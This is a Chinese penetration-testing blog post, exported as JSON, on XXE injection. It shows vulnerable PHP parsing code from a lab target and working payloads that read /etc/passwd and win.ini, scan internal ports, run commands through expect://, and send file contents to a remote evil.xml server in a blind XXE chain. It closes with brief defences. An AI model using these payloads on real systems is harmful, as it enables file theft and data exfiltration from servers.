{"title":"XXE漏洞","uid":"f517cbae543576764284438e95f2dbcc","slug":"XXE漏洞","date":"2021-10-09T10:08:52.627Z","updated":"2021-10-09T10:09:30.044Z","comments":true,"path":"api/articles/XXE漏洞.json","keywords":null,"cover":[],"content":"<h1 id=\"一、漏洞描述\"><a href=\"#一、漏洞描述\" class=\"headerlink\" title=\"一、漏洞描述\"></a>一、漏洞描述</h1><p>XML 外部实体注入（XML External Entity）简称 XXE 漏洞，XML 用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。 </p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!--文档类型定义--&gt;\n&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;\n&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义 note 元素有四个元素--&gt;\n&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义 to 元素为”#PCDATA”类型--&gt;\n&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义 from 元素为”#PCDATA”类型--&gt;\n&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义 head 元素为”#PCDATA”类型--&gt;\n&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义 body 元素为”#PCDATA”类型--&gt;\n]]]&gt;\n&lt;!--文档元素--&gt;\n&lt;note&gt;\n&lt;to&gt;Dave&lt;&#x2F;to&gt;\n&lt;from&gt;Tom&lt;&#x2F;from&gt;\n&lt;head&gt;Reminder&lt;&#x2F;head&gt;\n&lt;body&gt;You are a good man&lt;&#x2F;body&gt;\n&lt;&#x2F;note&gt;</code></pre>\n\n<p>常见的XML语法结构如下所示：</p>\n<!--XML 申明-->\n\n<p>其中，文档定义类型（DTD）可以是内部声明也可以引用外部 DTD。</p>\n<p>内部声明 DTD 格式：<!DOCTYPE 根元素 [元素声明]>。</p>\n<p>引用外部 DTD 格式：<!DOCTYPE 根元素 SYSTEM “文件名”>。</p>\n<p>在 DTD 中进行实体说明时，将使用 ENTITY 关键字来声明。实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体可在内部或外部进行声明。</p>\n<p>内部声明实体格式：<!ENTITY 实体名称 “实体的值”>。</p>\n<p>引用外部实体格式：<!ENTITY 实体名称 SYSTEM “URI”>。</p>\n<p>SYSTEM、PUBLIC 对外部资源进行申请。</p>\n<p>由于 xxe 漏洞主要是利用了 DTD 引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。当libXML &lt;libxml2.9 才会造成外部注入漏洞。</p>\n<p>语法引用外部的实体，而非内部实体，那么 URI 中能写哪些类型的外部实体呢？</p>\n<p>主要的有 file、http、https、ftp 等等，当然不同的程序支持的不一样：</p>\n<p><img src=\"https://tcs.teambition.net/storage/3128e3f8e3c7efa784539bef4b42ab208f32?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IiIsImV4cCI6MTYzNDM3ODg5MywiaWF0IjoxNjMzNzc0MDkzLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMjhlM2Y4ZTNjN2VmYTc4NDUzOWJlZjRiNDJhYjIwOGYzMiJ9.ojSLzjUzFxR6UxBD47fpBlEGPMNYXyhba-v7FjVu3yg&download=%E6%8D%95%E8%8E%B7.PNG\"></p>\n<h1 id=\"二、白盒分析\"><a href=\"#二、白盒分析\" class=\"headerlink\" title=\"二、白盒分析\"></a>二、白盒分析</h1><h2 id=\"1-（moonsec靶机）\"><a href=\"#1-（moonsec靶机）\" class=\"headerlink\" title=\"1 （moonsec靶机）\"></a>1 （moonsec靶机）</h2><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">&lt;?php\nif(isset($_POST[&#39;submit&#39;]) and $_POST[&#39;xml&#39;] !&#x3D; null)&#123;\n\t$xml &#x3D;$_POST[&#39;xml&#39;];\n&#x2F;&#x2F; $xml &#x3D; $test;\n\t$data &#x3D; @simplexml_load_string($xml,&#39;SimpleXMLElement&#39;,LIBXML_NOENT);\n\tif($data)&#123;\n\t\t$html.&#x3D;&quot;&lt;pre&gt;&#123;$data&#125;&lt;&#x2F;pre&gt;&quot;;\n\t&#125;else&#123;\n\t\t$html.&#x3D;&quot;&lt;p&gt;XML 声明、DTD 文档类型定义、文档元素这些都搞懂了吗?&lt;&#x2F;p&gt;&quot;;\n\t&#125;\n&#125;\n?&gt;</code></pre>\n\n<p>获取 post 的 xml 文件 传递到 simplexml_load_string 再进行输出会遭成 xxe 注入测试的 payload</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">&lt;?xml version &#x3D; &quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; ]&gt; &lt;x&gt;&amp;f;&lt;&#x2F;x&gt;</code></pre>\n\n<h2 id=\"2\"><a href=\"#2\" class=\"headerlink\" title=\"2\"></a>2</h2><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">&lt;?php\n$string_xml &#x3D; &#39;&lt;?xml version&#x3D;&quot;1.0&quot;\nencoding&#x3D;&quot;utf-8&quot;?&gt;&lt;note&gt;&lt;to&gt;George&lt;&#x2F;to&gt;&lt;from&gt;John&lt;&#x2F;from&gt;&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;&lt;body&gt;xml\n实体注入&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;&#39;;\n$xml &#x3D; isset($_GET[&#39;xml&#39;])?$_GET[&#39;xml&#39;]:$string_xml;\n$data &#x3D; simplexml_load_string($xml);\necho &#39;&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&#39;;\nprint_r($data);\n?&gt;</code></pre>\n\n\n\n<p>获取 xml 变量 创建 dom 对象 转入 xml 进行处理输出。</p>\n<p>simplexml_load_string() 函数把 XML 字符串载入对象中</p>\n<h1 id=\"三、攻击\"><a href=\"#三、攻击\" class=\"headerlink\" title=\"三、攻击\"></a>三、攻击</h1><h2 id=\"1、有回显\"><a href=\"#1、有回显\" class=\"headerlink\" title=\"1、有回显\"></a>1、有回显</h2><pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b &quot;xxe&quot;&gt;]&gt;&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</code></pre>\n\n<p>xxe 漏洞常用利用如下</p>\n<p>1.读取敏感文件</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;\n&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;Windows&#x2F;win.ini&quot;&gt;]&gt;&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</code></pre>\n\n<p>url 编码</p>\n<p>读取 windows 文件</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxe.php?xml&#x3D;&lt;%3fxml version%3d&quot;1.0&quot;%3f&gt;&lt;!DOCTYPE%20 a%20 [&lt;!ENTITY b SYSTEM &quot;file%3a%2f%2f%2fC%3a%2fWindows%2fwin.ini&quot;&gt;]&gt;&lt;c&gt;%26b%3b&lt;%2fc&gt;</code></pre>\n\n<p>linux 就读取/etc/passwd 文件进行测试</p>\n<p>2.使用 php 伪协议 php://filter 读取文件</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;\n&lt;!DOCTYPE xdsec [\n&lt;!ELEMENT methodname ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php&quot; &gt;]&gt;\n&lt;methodcall&gt;\n&lt;methodname&gt;&amp;xxe;&lt;&#x2F;methodname&gt;\n&lt;&#x2F;methodcall&gt;</code></pre>\n\n\n\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxe.php?xml&#x3D;%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%20%0a%3c%21%44%4f%43%54%59%50%45%20%78%64%73%65%63%20%5b%0a%3c%21%45%4c%45%4d%45%4e%54%20%6d%65%74%68%6f%64%6e%61%6d%65%20%41%4e%59%20%3e%0a%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%72%65%61%64%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%70%68%70%69%6e%66%6f%2e%70%68%70%22%20%3e%5d%3e%0a%3c%6d%65%74%68%6f%64%63%61%6c%6c%3e%0a%3c%6d%65%74%68%6f%64%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%6d%65%74%68%6f%64%6e%61%6d%65%3e%0a%3c%2f%6d%65%74%68%6f%64%63%61%6c%6c%3e</code></pre>\n\n\n\n<p>3.扫描内网和端口</p>\n<p>通过扫描 ip 和端口确定内网机器的 ip 和端口开发情况，访问端口会获取 baner 信息</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY test SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&quot;&gt;\n]&gt;\n&lt;abc&gt;&amp;test;&lt;&#x2F;abc&gt;\nhttp:&#x2F;&#x2F;127.0.0.1&#x2F;xxe.php?xml&#x3D;%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%3f%3e%0a%3c%21%44%4f%43%54%59%50%45%20%41%4e%59%20%5b%0a%3c%21%45%4e%54%49%54%59%20%74%65%73%74%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%38%30%22%3e%0a%5d%3e%0a%3c%61%62%63%3e%26%74%65%73%74%3b%3c%2f%61%62%63%3e</code></pre>\n\n\n\n<p>4.执行命令</p>\n<p>若开启 expect 扩展</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">http:&#x2F;&#x2F;webpenter.com&#x2F;xxe.php?xml&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY test SYSTEM &quot;expect:&#x2F;&#x2F;whoami&quot;&gt;\n]&gt;\n&lt;abc&gt;&amp;test;&lt;&#x2F;abc&gt;</code></pre>\n\n\n\n<h2 id=\"2、没回显\"><a href=\"#2、没回显\" class=\"headerlink\" title=\"2、没回显\"></a>2、没回显</h2><p>称为 blind xxe 可以使用外带数据通道 提取数据</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY[\n&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt;\n&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.107&#x2F;evil.xml&quot;&gt;\n%remote;\n%all;\n]&gt;\n&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;</code></pre>\n\n<p>远程服务器上的</p>\n<p>evil.xml 文件内容</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;192.168.0.107&#x2F;1.php?file&#x3D;%file;&#39;&gt;&quot;&gt;</code></pre>\n\n\n\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">&lt;?php file_put_contents(&quot;1.txt&quot;, $_GET[&#39;file&#39;]); ?&gt;</code></pre>\n\n\n\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">http:&#x2F;&#x2F;127.0.0.1&#x2F;xxe.php?xml&#x3D;%3C%3fxml%20version%3d%221.0%22%3f%3E%0A%3C!DOCTYPE%20ANY[%0A%3C!ENTITY%20%25%20file%20SYSTEM%20%22file%3a%2f%2f%2fC%3a%2f1.txt%22%3E%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http%3a%2f%2f192.168.0.146%2fevil.xml%22%3E%0A%25remote%3b%0A%25all%3b%0A]%3E%0A%3Croot%3E%26send%3b%3C%2froot%3E</code></pre>\n\n<p>文件写入成功。获取 1.txt 内容。</p>\n<h1 id=\"三、防御\"><a href=\"#三、防御\" class=\"headerlink\" title=\"三、防御\"></a>三、防御</h1><p>1.使用开发语言提供的禁用外部实体的方法</p>\n<p>PHP：</p>\n<p>libxml_disable_entity_loader(true);</p>\n<p>JAVA:</p>\n<p>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</p>\n<p>dbf.setExpandEntityReferences(false);</p>\n<p>Python：</p>\n<p>from lxml import etree</p>\n<p>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>\n<p>2.过滤用户提交的 XML 数据</p>\n<p>关键词：&lt;!DOCTYPE 和&lt;!ENTITY，或者，SYSTEM 和 PUBLIC</p>\n<p>3.升级 libxml 组件</p>\n","text":"一、漏洞描述XML 外部实体注入（XML External Entity）简称 XXE 漏洞，XML 用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML 文档结构包括 XML 声明、DTD 文档类型定义...","link":"","photos":[],"count_time":{"symbolsCount":"6.5k","symbolsTime":"6 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":4,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":4,"path":"api/tags/渗透测试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">一、漏洞描述</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E7%99%BD%E7%9B%92%E5%88%86%E6%9E%90\"><span class=\"toc-text\">二、白盒分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-%EF%BC%88moonsec%E9%9D%B6%E6%9C%BA%EF%BC%89\"><span class=\"toc-text\">1 （moonsec靶机）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2\"><span class=\"toc-text\">2</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">三、攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1%E3%80%81%E6%9C%89%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">1、有回显</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2%E3%80%81%E6%B2%A1%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">2、没回显</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E9%98%B2%E5%BE%A1\"><span class=\"toc-text\">三、防御</span></a></li></ol>","author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"https://weibo.com/u/7458958339","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Spring Boot Vulnerability Exploit Check List","uid":"f5a81cc3188fd765faea5ed43a886140","slug":"Spring Boot Vulnerability Exploit Check List","date":"2021-10-09T10:24:07.065Z","updated":"2021-10-09T10:24:01.917Z","comments":true,"path":"api/articles/Spring Boot Vulnerability Exploit Check List.json","keywords":null,"cover":null,"text":"Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list 目录 Spring Boot Vulnerability Exploit Check List 零：路由和版本 0x01：路由知识 0x02：版本知识 组件版本的相互依赖关系： Sp...","link":"","photos":[],"count_time":{"symbolsCount":"33k","symbolsTime":"30 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":4,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":4,"path":"api/tags/渗透测试.json"}],"author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"https://weibo.com/u/7458958339","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"五、Python的类型与运算-字符串（下","uid":"c957b32eb0e2922ff6da2063068fd723","slug":"五、Python的类型与运算-字符串（下","date":"2021-10-09T10:03:02.650Z","updated":"2021-10-09T10:05:13.302Z","comments":true,"path":"api/articles/五、Python的类型与运算-字符串（下.json","keywords":null,"cover":null,"text":"五、Python的类型与运算-字符串（下）一、字符串方法 除表达式之外，字符串还提供了一系列的方法去实现更复杂的文本处理任务。方法是与特定的对象相关联在一起的函数。从技术角度来讲，它们附属于对象的属性，而这些属性不过是些调用函数罢了。在Python中，表达式和内置函数可能在不同范...","link":"","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[{"name":"python","slug":"python","count":5,"path":"api/categories/python.json"}],"tags":[{"name":"python","slug":"python","count":5,"path":"api/tags/python.json"}],"author":{"name":"街溜子小王","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"默默学习的街溜子","socials":{"github":"https://github.com/ztohacker","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"https://weibo.com/u/7458958339","zhihu":"","csdn":"","juejin":"","customs":{}}}}}